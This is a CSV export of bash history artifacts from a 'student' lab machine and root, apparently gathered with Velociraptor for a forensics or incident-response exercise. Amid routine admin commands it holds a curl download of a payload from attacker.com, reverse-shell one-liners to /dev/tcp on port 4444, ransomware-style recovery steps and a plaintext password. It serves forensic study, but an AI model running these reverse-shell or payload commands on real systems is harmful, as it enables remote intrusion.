@@ -1,0 +1,199 @@
+OSPath,Mtime,Username,CommandLine,DownloadCommand
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo su,sudo su
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,vi test.txt,vi test.txt
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget https://github.com/Velocidex/velociraptor/releases/download/v0.74/velociraptor-v0.74.1-linux-amd64,wget https://github.com/Velocidex/velociraptor/releases/download/v0.74/velociraptor-v0.74.1-linux-amd64
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x velociraptor-v0.74.1-linux-amd64 ,chmod +x velociraptor-v0.74.1-linux-amd64 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./velociraptor-v0.74.1-linux-amd64 comfig client generate -i,./velociraptor-v0.74.1-linux-amd64 comfig client generate -i
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./velociraptor-v0.74.1-linux-amd64 config client generate -i,./velociraptor-v0.74.1-linux-amd64 config client generate -i
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./velociraptor-v0.74.1-linux-amd64 config client,./velociraptor-v0.74.1-linux-amd64 config client
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ifconfig,ifconfig
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip -a,ip -a
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip a,ip a
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ping 10.9.8.169,ping 10.9.8.169
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo su,sudo su
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,exit,exit
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls /Down,ls /Down
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls Download,ls Download
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd Downloads,cd Downloads
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,curl,curl
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,curl http://localhost:8080/?name=world,curl http://localhost:8080/?name=world
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,exit,exit
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x open_termial.sh ,chmod +x open_termial.sh 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./open_termial.sh ,./open_termial.sh 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,libreoffice --headless --convert-to pdf open_terminal.sh,libreoffice --headless --convert-to pdf open_terminal.sh
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,pwd,pwd
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,libreoffice --headless --convert-to pdf /home/student/Downloads/open_terminal.sh,libreoffice --headless --convert-to pdf /home/student/Downloads/open_terminal.sh
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo apt install enscript ghostscript,sudo apt install enscript ghostscript
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,enscript open_terminal.sh -o - | ps2pdf - open_terminal.pdf,enscript open_terminal.sh -o - | ps2pdf - open_terminal.pdf
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,enscript /home/student/Downloads/open_terminal.sh -o - | ps2pdf - open_terminal.pdf,enscript /home/student/Downloads/open_terminal.sh -o - | ps2pdf - open_terminal.pdf
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,"enscript ""/home/student/Downloads/open_terminal.sh"" -o - | ps2pdf - ""open_terminal.pdf""","enscript ""/home/student/Downloads/open_terminal.sh"" -o - | ps2pdf - ""open_terminal.pdf"""
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls -l /home/student/Downloads/open_terminal.sh,ls -l /home/student/Downloads/open_terminal.sh
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cat open_terminal.sh,cat open_terminal.sh
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,"enscript ""/home/student/Downloads/open_terminal.sh"" -o - | ps2pdf - ""open_termial.pdf""","enscript ""/home/student/Downloads/open_terminal.sh"" -o - | ps2pdf - ""open_termial.pdf"""
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,"enscript ""/home/student/Downloads/open_termial.sh"" -o - | ps2pdf - ""open_terminal.pdf""","enscript ""/home/student/Downloads/open_termial.sh"" -o - | ps2pdf - ""open_terminal.pdf"""
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website.go ,go run website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,vi website.go ,vi website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano website.go ,nano website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website.go ,go run website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano website.go ,nano website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website.go ,go run website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano website.go ,nano website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website.go ,go run website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website3.go ,go run website3.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip a,ip a
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,pslist,pslist
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,apt install pslist,apt install pslist
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo 'apt install pslist,sudo 'apt install pslist
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo 'apt install pslist,sudo 'apt install pslist
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo apt install pslist,sudo apt install pslist
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,pslist,pslist
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,netstat,netstat
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo apt install net-tools,sudo apt install net-tools
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,netstat,netstat
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,netstat | grep 8080,netstat | grep 8080
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,curl http://attacker.com/malware.sh -o /tmp/payload.sh,curl http://attacker.com/malware.sh -o /tmp/payload.sh
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo apt intstall curl,sudo apt intstall curl
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo apt install curl,sudo apt install curl
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,curl http://attacker.com/malware.sh -o /tmp/payload.sh,curl http://attacker.com/malware.sh -o /tmp/payload.sh
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,/tmp/,/tmp/
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls /tmp/,ls /tmp/
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cat /tmp/payload.sh ,cat /tmp/payload.sh 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo apt install golang-go,sudo apt install golang-go
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip a,ip a
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/website.go ,nano Downloads/website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run Downloads/website.go ,go run Downloads/website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/website.go ,nano Downloads/website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run Downloads/website.go ,go run Downloads/website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/website.go ,nano Downloads/website.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/website2.go ,nano Downloads/website2.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls Downloads/,ls Downloads/
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/wesite2.go ,nano Downloads/wesite2.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run Downloads/wesite2.go ,go run Downloads/wesite2.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run Downloads/website3.go ,go run Downloads/website3.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/website3.go ,nano Downloads/website3.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano Downloads/website4.go,nano Downloads/website4.go
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd /home/student/,cd /home/student/
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,mkdir secret-folder,mkdir secret-folder
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd secret-folder/,cd secret-folder/
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano test1.txt,nano test1.txt
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano test.txt,nano test.txt
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano test2.txt,nano test2.txt
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano test3.txt,nano test3.txt
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,#!/bin/bash,#!/bin/bash
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1,bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,bash -i >& /dev/tcp/10.9.8.228/4444 0>&1,bash -i >& /dev/tcp/10.9.8.228/4444 0>&1
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,reboot,reboot
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ip a,ip a
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ps,ps
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,kill 2739,kill 2739
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ps,ps
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,pkill 2739,pkill 2739
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ps,ps
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,pkill 2704,pkill 2704
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ps,ps
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo pkill 2739,sudo pkill 2739
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ps,ps
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo kill -2739,sudo kill -2739
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo kill -9 2739,sudo kill -9 2739
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ps,ps
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,sudo kill -2739,sudo kill -2739
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,reboot,reboot
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd ..,cd ..
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,/home/student,/home/student
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,scp -p tartans student@1student@10.9.8.120:/home/student,scp -p tartans student@1student@10.9.8.120:/home/student
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,scp -p tartans student@10.9.8.244:/home/student/testenc.go student@10.9.8.120:/home/student/testenc.go,scp -p tartans student@10.9.8.244:/home/student/testenc.go student@10.9.8.120:/home/student/testenc.go
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,scp student@10.9.8.244:/home/student/testenc.go student@10.9.8.120:/home/student/testenc.go,scp student@10.9.8.244:/home/student/testenc.go student@10.9.8.120:/home/student/testenc.go
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,yes,yes
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,tartans,tartans
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd ..,cd ..
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,scp -o StrictHostKeyChecking=no testenc.go student@10.9.8.244:/home/student,scp -o StrictHostKeyChecking=no testenc.go student@10.9.8.244:/home/student
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,scp -o StrictHostKeyChecking=no student@10.9.8.244:/home/student/testenc.go .,scp -o StrictHostKeyChecking=no student@10.9.8.244:/home/student/testenc.go .
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,tartans,tartans
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,reboot,reboot
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,go run website4.go ,go run website4.go 
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd ..,cd ..
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cd secret-folder,cd secret-folder
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cat README_RESTORE_FILES.txt,cat README_RESTORE_FILES.txt
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget http://10.9.8.244:8000/rsa-dec,wget http://10.9.8.244:8000/rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dec,./rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x rsa-dec,chmod +x rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dex,./rsa-dex
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dec,./rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget http://10.9.8.244:8000/private.pem,wget http://10.9.8.244:8000/private.pem
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dec,./rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,rm rsa-dec.enc,rm rsa-dec.enc
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,rm rsa-dec,rm rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget http://10.9.8.244:8000/rsa-dec,wget http://10.9.8.244:8000/rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dec,./rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x rsa-dec,chmod +x rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dec,./rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget http://10.9.8.244:8000/rsa-dec,wget http://10.9.8.244:8000/rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,rm rsa-dec rsa-dec.1,rm rsa-dec rsa-dec.1
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,wget http://10.9.8.244:8000/rsa-dec,wget http://10.9.8.244:8000/rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,chmod +x rsa-dec,chmod +x rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,./rsa-dec,./rsa-dec
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cat private.pem,cat private.pem
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,ls,ls
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,nano private.pem,nano private.pem
+/home/student/.bash_history,2025-04-22T21:24:23-04:00,,cat private.pem,cat private.pem
+/root/.bash_history,2025-04-22T16:42:57-04:00,,apt update && apt upgrade -y,apt update && apt upgrade -y
+/root/.bash_history,2025-04-22T16:42:57-04:00,,nano /etc/hosts,nano /etc/hosts
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ping velociraptor.com,ping velociraptor.com
+/root/.bash_history,2025-04-22T16:42:57-04:00,,velociraptor config client > client.config.yaml,velociraptor config client > client.config.yaml
+/root/.bash_history,2025-04-22T16:42:57-04:00,,md5sum client.config.yaml ,md5sum client.config.yaml 
+/root/.bash_history,2025-04-22T16:42:57-04:00,,./velociraptor-v0.74.1-linux-amd64 --config client.config.yaml client -v,./velociraptor-v0.74.1-linux-amd64 --config client.config.yaml client -v
+/root/.bash_history,2025-04-22T16:42:57-04:00,,./velociraptor-v0.74.1-linux-amd64 --config client.config.yaml debian client,./velociraptor-v0.74.1-linux-amd64 --config client.config.yaml debian client
+/root/.bash_history,2025-04-22T16:42:57-04:00,,dpkg -i velociraptor_client_0.74.1_amd64.deb ,dpkg -i velociraptor_client_0.74.1_amd64.deb 
+/root/.bash_history,2025-04-22T16:42:57-04:00,,systemctl status velociraptor_client,systemctl status velociraptor_client
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ssh student@10.9.8.169,ssh student@10.9.8.169
+/root/.bash_history,2025-04-22T16:42:57-04:00,,systemctl restart velociraptor_client,systemctl restart velociraptor_client
+/root/.bash_history,2025-04-22T16:42:57-04:00,,systemctl status velociraptor_client,systemctl status velociraptor_client
+/root/.bash_history,2025-04-22T16:42:57-04:00,,apt install openssh-server -y,apt install openssh-server -y
+/root/.bash_history,2025-04-22T16:42:57-04:00,,systemctl enable --now ssh,systemctl enable --now ssh
+/root/.bash_history,2025-04-22T16:42:57-04:00,,systemctl status ssh,systemctl status ssh
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ip a,ip a
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cd /var,cd /var
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls,ls
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cd log,cd log
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls,ls
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls | gerp auth,ls | gerp auth
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls | grep auth,ls | grep auth
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cat auth.log,cat auth.log
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls | grep auth,ls | grep auth
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls | grep sec,ls | grep sec
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls,ls
+/root/.bash_history,2025-04-22T16:42:57-04:00,,sudo -u velociraptor cat /var/log/auth.log,sudo -u velociraptor cat /var/log/auth.log
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cut -d: -f1 /etc/passwd,cut -d: -f1 /etc/passwd
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ps aux | grep velociraptor,ps aux | grep velociraptor
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cat /etc/systemd/system/velociraptor-client.service,cat /etc/systemd/system/velociraptor-client.service
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cd /etc/systemd/system,cd /etc/systemd/system
+/root/.bash_history,2025-04-22T16:42:57-04:00,,ls,ls
+/root/.bash_history,2025-04-22T16:42:57-04:00,,cat velociraptor_client.service ,cat velociraptor_client.service 
+/root/.bash_history,2025-04-22T16:42:57-04:00,,velociraptor client -v --config /etc/velociraptor/client.config.yaml,velociraptor client -v --config /etc/velociraptor/client.config.yaml
